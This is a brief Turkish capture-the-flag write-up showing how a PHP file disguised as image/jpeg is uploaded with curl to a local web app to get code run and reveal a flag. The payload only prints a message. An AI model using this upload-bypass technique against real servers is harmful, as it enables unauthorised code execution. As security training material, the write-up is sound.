### Exploit Açıklaması

Bu exploit, bir PHP dosyasını kötü amaçlı bir şekilde yükleyerek sunucuda kod çalıştırmayı hedefler. Aşağıdaki adımlar bu süreci açıklar:

1. **Kötü Amaçlı PHP Dosyası Oluşturma**: İlk olarak, kötü amaçlı bir PHP dosyası oluşturulur. Bu dosya, sunucuda çalıştırıldığında "I am bad" mesajını ekrana yazdırır.
    ```bash
    echo '<?php echo "I am bad" ?>' > /tmp/bad.php
    ```

2. **Dosya Yükleme**: Daha sonra, bu dosya bir `image/jpeg` dosyası olarak sunucuya yüklenir. Bu işlem `curl` komutu kullanılarak yapılır.
    ```bash
    curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/bad.php;type=image/jpeg" "http://localhost:8080/index.php?page=upload"
    ```

3. **Bayrağı Bulma**: Yükleme işlemi tamamlandıktan sonra, sunucunun yanıtı `grep` komutu ile taranarak "The flag is :" ifadesi aranır. Bu ifade, bayrağın bulunduğu yeri gösterir.
    ```bash
    | grep 'The flag is :'
    ```

Bu adımlar, sunucunun dosya yükleme işlevindeki bir güvenlik açığını kullanarak kötü amaçlı kod çalıştırmayı ve bayrağı elde etmeyi amaçlar.

### İlgili Dosya
[#file:flag.txt](#file:flag.txt-context)